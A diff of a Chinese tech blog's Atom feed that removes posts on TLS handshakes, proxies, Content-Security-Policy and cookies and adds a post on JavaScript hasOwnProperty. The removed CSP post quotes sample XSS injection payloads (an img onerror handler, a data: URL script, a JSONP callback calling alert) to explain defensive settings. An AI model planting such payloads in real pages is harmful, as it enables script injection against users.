-<p>pre master的存在在于SSL协议不信任每个主机都能产生完全随机的随机数，如果随机数不随机，那么pre master secret就有可能被猜出来，那么仅适用pre master secret作为密钥就不合适了，因此必须引入新的随机因素，那么客户端和服务器加上pre master secret三个随机数一同生成的密钥就不容易被猜出了，一个伪随机可能完全不随机，可是是三个伪随机就十分接近随机了，每增加一个自由度，随机性增加的可不是一。&quot;</p>
-</blockquote>
-<p>此外，如果前一步，服务器要求客户端证书，客户端会在这一步发送证书及相关信息。</p>
-<h3 id="44-服务器的最后回应">4.4 服务器的最后回应</h3>
-<p>服务器收到客户端的第三个随机数pre-master key之后，计算生成本次会话所用的&quot;会话密钥&quot;。然后，向客户端最后发送下面信息。</p>
-<blockquote>
-<p>（1）编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。</p>
-<p>（2）服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。</p>
-</blockquote>
-<p>至此，整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过用&quot;会话密钥&quot;加密内容。</p>
-<figure data-type="image" tabindex="2"><img src="https://leecss.com/post-images/1628721733951.jpg" alt="" loading="lazy"></figure>
-<h2 id="转载">转载</h2>
-<blockquote>
-<p>阮一峰</p>
-<p><a href="https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html</a></p>
-</blockquote>
-<h2 id="推荐阅读">推荐阅读</h2>
-<p><a href="https://mp.weixin.qq.com/s/StqqafHePlBkWAPQZg3NrA">一个故事讲完https</a></p>
-<p><a href="https://juejin.cn/post/6844904089495535624">看完这篇 HTTPS，和面试官扯皮就没问题了</a></p>
-<p><a href="https://www.ruanyifeng.com/blog/2016/08/migrate-from-http-to-https.html">HTTPS 升级指南</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[http-正向代理和反向代理]]></title>
-        <id>https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/</id>
-        <link href="https://leecss.com/post/http-zheng-xiang-dai-li-he-fan-xiang-dai-li/">
-        </link>
-        <updated>2021-08-07T14:51:30.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>Web 上的代理服务器是代表客户端完成事务处理的中间人。如果没有 Web 代理， HTTP 客户端就要直接与 HTTP 服务器进行对话。有了 Web 代理，客户端就可以与代理进行对话，然后由代理代表客户端与服务器进行交流。客户端仍然会完成对事务的处理，但它是通过代理服务器提供的优质服务来实现的。</p>
-<p>HTTP 的代理服务器既是 Web 服务器又是 Web 客户端。HTTP 客户端会向代理发送请求报文，代理服务器必须像 Web 服务器一样，正确地处理请求和连接，然后返回响应。同时，代理自身要向服务器发送请求，这样，其行为就必须像正确的 HTTP 客户端一样，要发送请求并接收响应。如果要创建自己的 HTTP 代理，就要认真地遵循为 HTTP 客户端和 HTTP 服务器制定的规则。</p>
-<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628347950236.webp" alt="" loading="lazy"></figure>
-<h2 id="类比学习">类比学习</h2>
-<h3 id="点餐">点餐</h3>
-<h4 id="没有代理">没有代理</h4>
-<p>假如餐厅是厨师自己开的，厨师自己做饭提供给客户，我们下单，然后厨师把饭提供给我们。</p>
-<p>我们是客户端，厨师是服务端，没有代理</p>
-<h4 id="正向代理">正向代理</h4>
-<p>假如餐厅中有一名厨师，和一名服务员，我们下单告诉服务员，服务员告诉厨师，厨师做好饭后交给服务员，服务员端给我们。</p>
-<p>我们是客户端，服务员是正向代理，厨师是服务端。</p>
-<p>在这个过程中，服务员代替我们去告诉厨师想要吃的饭，厨师只知道服务员，并不知道最终吃饭的人是谁。</p>
-<h4 id="反向代理">反向代理</h4>
-<p>假如餐厅中有一名服务员，下单系统，和多名厨师，我们下单告诉服务员，服务员在下单系统上提交菜品，下单系统按照忙闲情况分配了厨师。</p>
-<p>我们是客户端，服务员是正向代理，下单系统是反向代理，厨师是服务端</p>
-<p>在这个过程中，我们只知道是在下单系统上提交的订单，但是不知道是哪位厨师提供的</p>
-<h3 id="借钱">借钱</h3>
-<p><strong>假设由A、B和C三人，他们之间存在借钱的关系。</strong></p>
-<h4 id="正向代理-2">正向代理</h4>
-<ol>
-<li>A需要钱，A知道C由很多钱，想向C借钱</li>
-<li>但是A和C有矛盾，于是A想到通过B去借C借钱</li>
-<li>B向C借到钱了，C不知道是A的存在</li>
-<li>这样B就帮助A借到了Z的钱</li>
-</ol>
-<p>在这个过程，B就充当了代理借钱的角色，并且是代替A去借钱的，这样就是正向代理。</p>
-<figure data-type="image" tabindex="2"><img src="https://leecss.com/post-images/1628348139202.png" alt="" loading="lazy"></figure>
-<h4 id="反向代理-2">反向代理</h4>
-<ol>
-<li>A需要钱，C有很多钱，A不知道C很多钱</li>
-<li>A找B借钱</li>
-<li>B知道C有很多钱</li>
-<li>B向C借钱，并把借到的钱给A，而没有使用自己的钱借给A</li>
-<li>A拿到钱以后，以为钱是B的，A不知道C的存在</li>
-</ol>
-<p>在这个过程当中，B也充当了代理借钱的角色，不过这次不是代替A去借的，而是用C的钱借给A的，换言之即是代替C将钱借给了A，这就是反向代理。</p>
-<figure data-type="image" tabindex="3"><img src="https://leecss.com/post-images/1628348150291.png" alt="" loading="lazy"></figure>
-<h3 id="其他">其他</h3>
-<p>正向代理: 买票的黄牛</p>
-<p>反向代理: 租房的代理</p>
-<h2 id="正向代理-3">正向代理</h2>
-<p>是指是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容， 客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。</p>
-<figure data-type="image" tabindex="4"><img src="https://leecss.com/post-images/1628348113934.png" alt="" loading="lazy"></figure>
-<h3 id="特点">特点</h3>
-<ol>
-<li>代理客户;</li>
-<li>隐藏真实的客户，为客户端收发请求，使真实客户端对服务器不可见;</li>
-<li>一个局域网内的所有用户可能被一台服务器做了正向代理，由该台服务器负责 HTTP 请求;</li>
-<li>意味着同服务器做通信的是正向代理服务器;</li>
-</ol>
-<h3 id="作用">作用</h3>
-<ol>
-<li>访问原来无法访问的资源，如google</li>
-<li>可以做缓存，加速访问资源</li>
-<li>对客户端访问授权，上网进行认证</li>
-<li>代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</li>
-</ol>
-<figure data-type="image" tabindex="5"><img src="https://leecss.com/post-images/1628348191475.jpg" alt="" loading="lazy"></figure>
-<h2 id="反向代理-3">反向代理</h2>
-<p>是指以代理服务器来接受 Internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p>
-<figure data-type="image" tabindex="6"><img src="https://leecss.com/post-images/1628348098770.png" alt="" loading="lazy"></figure>
-<h3 id="特点-2">特点</h3>
-<ol>
-<li>代理服务器;</li>
-<li>隐藏了真实的服务器，为服务器收发请求，使真实服务器对客户端不可见;</li>
-<li>负载均衡服务器，将用户的请求分发到空闲的服务器上;</li>
-<li>意味着用户和负载均衡服务器直接通信，即用户解析服务器域名时得到的是负载均衡服务器的 IP ;</li>
-</ol>
-<h3 id="作用-2">作用</h3>
-<ol>
-<li>保证内网的安全，可以使用反向代理提供WAF功能，阻止web攻击</li>
-<li>负载均衡，通过反向代理服务器来优化网站的负载</li>
-</ol>
-<figure data-type="image" tabindex="7"><img src="https://leecss.com/post-images/1628348224249.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="8"><img src="https://leecss.com/post-images/1628348235535.jpg" alt="" loading="lazy"></figure>
-<h2 id="总结">总结</h2>
-<h3 id="共同点">共同点</h3>
-<ol>
-<li>都是做为服务器和客户端的中间层</li>
-<li>都可以加强内网的安全性，阻止 web 攻击</li>
-<li>都可以做缓存机制，提高访问速度</li>
-</ol>
-<h3 id="区别">区别</h3>
-<ol>
-<li>正向代理其实是客户端的代理,反向代理则是服务器的代理。</li>
-<li>正向代理中，服务器并不知道真正的客户端到底是谁；而在反向代理中，客户端也不知道真正的服务器是谁。</li>
-<li>作用不同。正向代理主要是用来解决访问限制问题；而反向代理则是提供负载均衡、安全防护等作用。</li>
-</ol>
-<h2 id="图解">图解</h2>
-<figure data-type="image" tabindex="9"><img src="https://leecss.com/post-images/1628348020634.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="10"><img src="https://leecss.com/post-images/1628348030926.png" alt="" loading="lazy"></figure>
-<h2 id="参考">参考</h2>
-<p><a href="https://mp.weixin.qq.com/s/U5N4okQin9CJ4Bbl6U2EDA">如何向老板解释反向代理</a></p>
-<p><a href="https://www.zhihu.com/question/24723688/answer/583903276">知乎-慕课网</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[http-Content-Security-Policy]]></title>
-        <id>https://leecss.com/post/http-content-security-policy/</id>
-        <link href="https://leecss.com/post/http-content-security-policy/">
-        </link>
-        <updated>2021-08-07T08:12:18.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="http-content-security-policy">http-Content-Security-Policy</h1>
-<h2 id="一-简介">一、简介</h2>
-<p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
-<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
-<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p>
-<pre><code class="language-http">Content-Security-Policy: script-src 'self'; object-src 'none';
-style-src cdn.example.org third-party.org; child-src https:
+<p>对象实例的<code>hasOwnProperty</code>方法返回一个布尔值，用于判断某个属性定义在对象自身，还是定义在原型链上。</p>
+<pre><code class="language-js">Date.hasOwnProperty('length') // true
+Date.hasOwnProperty('toString') // false
 </code></pre>
-<p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p>
-<pre><code class="language-html">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;
+<p>上面代码表明，<code>Date.length</code>（构造函数<code>Date</code>可以接受多少个参数）是<code>Date</code>自身的属性，<code>Date.toString</code>是继承的属性。</p>
+<h2 id="hasownproperty-函数"><code>hasOwnProperty</code> 函数</h2>
+<p>为了判断一个对象是否包含<em>自定义</em>属性而不是原型链上的属性， 我们需要使用继承自 <code>Object.prototype</code> 的 <code>hasOwnProperty</code> 方法。</p>
+<p><code>hasOwnProperty</code> 是 JavaScript 中唯一一个处理属性但是<strong>不</strong>查找原型链的函数。</p>
+<pre><code class="language-js">// 修改Object.prototype
+Object.prototype.bar = 1; 
+var foo = {goo: undefined};
+
+foo.bar; // 1
+'bar' in foo; // true
+
+foo.hasOwnProperty('bar'); // false
+foo.hasOwnProperty('goo'); // true
 </code></pre>
-<p>上面代码中，CSP 做了如下配置。</p>
-<ul>
-<li>脚本：只信任当前域名</li>
-<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
-<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
-<li>框架（frame）：必须使用HTTPS协议加载</li>
-<li>其他资源：没有限制</li>
-</ul>
-<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
-<h2 id="二-限制选项">二、限制选项</h2>
-<p>CSP 提供了很多限制选项，涉及安全的各个方面。</p>
-<h3 id="资源加载限制">资源加载限制</h3>
-<p>以下选项限制各类资源的加载。</p>
-<ul>
-<li><code>script-src</code>：外部脚本</li>
-<li><code>style-src</code>：样式表</li>
-<li><code>img-src</code>：图像</li>
-<li><code>media-src</code>：媒体文件（音频和视频）</li>
-<li><code>font-src</code>：字体文件</li>
-<li><code>object-src</code>：插件（比如 Flash）</li>
-<li><code>child-src</code>：框架</li>
-<li><code>frame-ancestors</code>：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>）</li>
-<li><code>connect-src</code>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
-<li><code>worker-src</code>：<code>worker</code>脚本</li>
-<li><code>manifest-src</code>：manifest 文件</li>
-</ul>
-<h3 id="default-src">default-src</h3>
-<p><code>default-src</code>用来设置上面各个选项的默认值。</p>
-<pre><code class="language-http">Content-Security-Policy: default-src 'self'
+<p>只有 <code>hasOwnProperty</code> 可以给出正确和期望的结果，这在遍历对象的属性时会很有用。 <strong>没有</strong>其它方法可以用来排除原型链上的属性，而不是定义在对象<em>自身</em>上的属性。</p>
+<h3 id="hasownproperty-作为属性"><code>hasOwnProperty</code> 作为属性</h3>
+<p>JavaScript <strong>不会</strong>保护 <code>hasOwnProperty</code> 被非法占用，因此如果一个对象碰巧存在这个属性， 就需要使用<em>外部</em>的 <code>hasOwnProperty</code> 函数来获取正确的结果。</p>
+<pre><code class="language-js">var foo = {
+    hasOwnProperty: function() {
+        return false;
+    },
+    bar: 'Here be dragons'
+};
+
+foo.hasOwnProperty('bar'); // 总是返回 false
+
+// 使用其它对象的 hasOwnProperty，并将其上下文设置为foo
+({}).hasOwnProperty.call(foo, 'bar'); // true
 </code></pre>
-<p>上面代码限制所有的外部资源，都只能从当前域名加载。</p>
-<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
-<h3 id="url-限制">URL 限制</h3>
-<p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
-<ul>
-<li><code>frame-ancestors</code>：限制嵌入框架的网页</li>
-<li><code>base-uri</code>：限制<code>&lt;base#href&gt;</code></li>
-<li><code>form-action</code>：限制<code>&lt;form#action&gt;</code></li>
-</ul>
-<h3 id="其他限制">其他限制</h3>
-<p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
-<ul>
-<li><code>block-all-mixed-content</code>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
-<li><code>upgrade-insecure-requests</code>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
-<li><code>plugin-types</code>：限制可以使用的插件格式</li>
-<li><code>sandbox</code>：浏览器行为的限制，比如不能有弹出窗口等。</li>
-</ul>
-<h3 id="report-uri">report-uri</h3>
-<p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
-<pre><code class="language-http">Content-Security-Policy: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
+<p>当检查对象上某个属性是否存在时，<code>hasOwnProperty</code> 是<strong>唯一</strong>可用的方法。 同时在使用 <code>for in</code> loop遍历对象时，推荐<strong>总是</strong>使用 <code>hasOwnProperty</code> 方法， 这将会避免原型对象扩展带来的干扰。</p>
+<h2 id="for-in-循环"><code>for in</code> 循环</h2>
+<p>和 <code>in</code> 操作符一样，<code>for in</code> 循环同样在查找对象属性时遍历原型链上的所有属性。</p>
+<pre><code class="language-js">// 修改 Object.prototype
+Object.prototype.bar = 1;
+
+var foo = {moo: 2};
+for(var i in foo) {
+    console.log(i); // 输出两个属性：bar 和 moo
+}
 </code></pre>
-<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
-<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p>
-<pre><code class="language-json">{
-    &quot;csp-report&quot;: {
-     &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,
-     &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,
-     &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,
-     &quot;violated-directive&quot;: &quot;script-src 'self' https://apis.google.com&quot;,
-     &quot;original-policy&quot;: &quot;script-src 'self' https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;
+<p>由于不可能改变 <code>for in</code> 自身的行为，因此有必要过滤出那些不希望出现在循环体中的属性， 这可以通过 <code>Object.prototype</code> 原型上的 <code>hasOwnProperty</code> 函数来完成。</p>
+<h3 id="使用-hasownproperty-过滤">使用 <code>hasOwnProperty</code> 过滤</h3>
+<pre><code class="language-js">// foo 变量是上例中的
+for(var i in foo) {
+    if (foo.hasOwnProperty(i)) {
+        console.log(i);
     }
 }
 </code></pre>
-<h2 id="三-content-security-policy-report-only">三、Content-Security-Policy-Report-Only</h2>
-<p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。</p>
-<p>它必须与<code>report-uri</code>选项配合使用。</p>
-<pre><code class="language-http">Content-Security-Policy-Report-Only: default-src 'self'; ...; report-uri /my_amazing_csp_report_parser;
-</code></pre>
-<h2 id="四-选项值">四、选项值</h2>
-<p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
-<ul>
-<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
-<li>路径名：<code>example.org/resources/js/</code></li>
-<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
-<li>协议名：<code>https:</code>、<code>data:</code></li>
-<li>关键字<code>'self'</code>：当前域名，需要加引号</li>
-<li>关键字<code>'none'</code>：禁止加载任何外部资源，需要加引号</li>
-</ul>
-<p>多个值也可以并列，用空格分隔。</p>
-<pre><code class="language-http">Content-Security-Policy: script-src 'self' https://apis.google.com
-</code></pre>
-<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
-<pre><code class="language-http"># 错误的写法
-script-src https://host1.com; script-src https://host2.com
-
-# 正确的写法
-script-src https://host1.com https://host2.com
-</code></pre>
-<p>如果不设置某个限制选项，就是默认允许任何值。</p>
-<h2 id="五-script-src-的特殊值">五、script-src 的特殊值</h2>
-<p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
-<ul>
-<li><code>'unsafe-inline'</code>：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li>
-<li><code>unsafe-eval</code>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
-<li>nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li>
-<li>hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
-</ul>
-<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
-<pre><code class="language-http">Content-Security-Policy: script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'
-</code></pre>
-<p>页面内嵌脚本，必须有这个token才能执行。</p>
-<pre><code class="language-html">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;
-// some code
-&lt;/script&gt;
-</code></pre>
-<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
-<pre><code class="language-http">Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='
-</code></pre>
-<p>下面的代码就会允许执行，因为hash值相符。</p>
-<pre><code class="language-html">&lt;script&gt;alert('Hello, world.');&lt;/script&gt;
-</code></pre>
-<p>注意，计算hash值的时候，<code>&lt;script&gt;</code>标签不算在内。</p>
-<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
-<h2 id="六-注意点">六、注意点</h2>
-<p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
-<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
-<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
-<p>下面是两个恶意攻击的例子。</p>
-<pre><code class="language-html">&lt;img src=&quot;x&quot; onerror=&quot;evil()&quot;&gt;
-&lt;script src=&quot;data:text/javascript,evil()&quot;&gt;&lt;/script&gt;
-</code></pre>
-<p>（3）必须特别注意 JSONP 的回调函数。</p>
-<pre><code class="language-html">&lt;script
-src=&quot;/path/jsonp?callback=alert(document.domain)//&quot;&gt;
-&lt;/script&gt;
-</code></pre>
-<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
+<p>这个版本的代码是唯一正确的写法。由于我们使用了 <code>hasOwnProperty</code>，所以这次<strong>只</strong>输出 <code>moo</code>。 如果不使用 <code>hasOwnProperty</code>，则这段代码在原生对象原型（比如 <code>Object.prototype</code>）被扩展时可能会出错。</p>
+<p>一个广泛使用的类库 <a href="http://www.prototypejs.org/">Prototype</a> 就扩展了原生的 JavaScript 对象。 因此，当这个类库被包含在页面中时，不使用 <code>hasOwnProperty</code> 过滤的 <code>for in</code> 循环难免会出问题。</p>
 <h2 id="转载">转载</h2>
-<blockquote>
-<p>阮一峰</p>
-<p><a href="https://www.ruanyifeng.com/blog/2016/09/csp.html">https://www.ruanyifeng.com/blog/2016/09/csp.html</a></p>
-</blockquote>
-<h2 id="文档">文档</h2>
-<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">MDN/HTTP/Headers/Content-Security-Policy</a></p>
+<p><a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#object.hasownproperty">JavaScript秘密花园</a></p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[http-cookie]]></title>
-        <id>https://leecss.com/post/http-cookie/</id>
-        <link href="https://leecss.com/post/http-cookie/">
+        <title type="html"><![CDATA[JavaScript-原型链]]></title>
+        <id>https://leecss.com/post/javascript-yuan-xing-lian/</id>
+        <link href="https://leecss.com/post/javascript-yuan-xing-lian/">
         </link>
-        <updated>2021-08-04T14:33:34.000Z</updated>
+        <updated>2021-08-29T01:59:19.000Z</updated>
         <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
-<p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p>
-<ul>
-<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
-<li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
-<li>追踪：记录和分析用户行为。</li>
-</ul>
-<p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p>
-<p>Cookie 包含以下几方面的信息。</p>
-<ul>
-<li>Cookie 的名字</li>
-<li>Cookie 的值（真正的数据写在这里面）</li>
-<li>到期时间</li>
-<li>所属域名（默认是当前域名）</li>
-<li>生效的路径（默认是当前网址）</li>
-</ul>
-<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含<code>www.example.com</code>这个域名，以及根路径<code>/</code>。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p>
-<p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
-<pre><code class="language-js">// 浏览器是否打开 Cookie 功能
-window.navigator.cookieEnabled // true
-</code></pre>
-<p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>
-<pre><code class="language-js">// 当前网页的 Cookie
-document.cookie
-</code></pre>
-<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
-<p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>
-<h2 id="来源">来源</h2>
-<p>HTTP 是一种不保存状态，即无状态（stateless）协议。HTTP 协议自身不对请求和响应之间的通信状态进行保存。也就是说在 HTTP 这个级别，协议对于发送过的请求或响应都不做持久化处理。</p>
-<p>使用 HTTP 协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把 HTTP 协议设计成如此简单的。</p>
-<p>可是，随着 Web 的不断发展，因无状态而导致业务处理变得棘手的情况增多了。比如，用户登录到一家购物网站，即使他跳转到该站的其他页面后，也需要能继续保持登录状态。针对这个实例，网站为了能够掌握是谁送出的请求，需要保存用户的状态。</p>
-<p>HTTP/1.1 虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了 Cookie 技术。有了 Cookie 再用 HTTP 协议通信，就可以管理状态了。</p>
-<p><strong>Cookie 的本职工作并非本地存储，而是“维持状态”</strong>。</p>
-<h2 id="原理">原理</h2>
-<p>cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。</p>
-<p><strong>cookie是服务端生成，客户端进行维护和存储</strong>。</p>
-<p>第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个Set-Cookie选项，将cookie放入到响应请求中，在浏览器第二次发请求的时候，会通过Cookie请求头部将Cookie信息发送给服务器，服务端会辨别用户身份，另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>
-<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628169793793.jpg" alt="" loading="lazy"></figure>
-<h2 id="生成">生成</h2>
-<p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>
-<pre><code class="language-http">Set-Cookie:foo=bar
-</code></pre>
-<p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>
-<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
-<pre><code class="language-http">HTTP/1.0 200 OK
-Content-type: text/html
-Set-Cookie: yummy_cookie=choco
-Set-Cookie: tasty_cookie=strawberry
-
-[page content]
-</code></pre>
-<p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>
-<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
-Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
-Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
-Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
-Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
-Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
-</code></pre>
-<p>上面的几个属性的含义，将在后文解释。</p>
-<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>
-<pre><code class="language-http">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
-</code></pre>
-<p>下面是一个例子。</p>
-<pre><code class="language-http">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
-</code></pre>
-<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>
-<pre><code class="language-http">Set-Cookie: key1=value1; domain=example.com; path=/blog
-</code></pre>
-<p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>
-<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/blog
-</code></pre>
-<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
-<pre><code class="language-http">Set-Cookie: key1=value2; domain=example.com; path=/
-</code></pre>
-<p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
-<pre><code class="language-http">Cookie: key1=value1; key1=value2
-</code></pre>
-<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
-<h3 id="demo-nodejs">demo-node.js</h3>
-<p>服务端返回数据的时候，通过 <strong>Set-Cookie</strong> ，保存到浏览器中。</p>
-<p>test.html</p>
-<pre><code class="language-html">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-  &lt;meta charset=&quot;UTF-8&quot;&gt;
-  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
-  &lt;title&gt;Document&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;div&gt;Content&lt;/div&gt;
-&lt;/body&gt;
-&lt;script&gt;
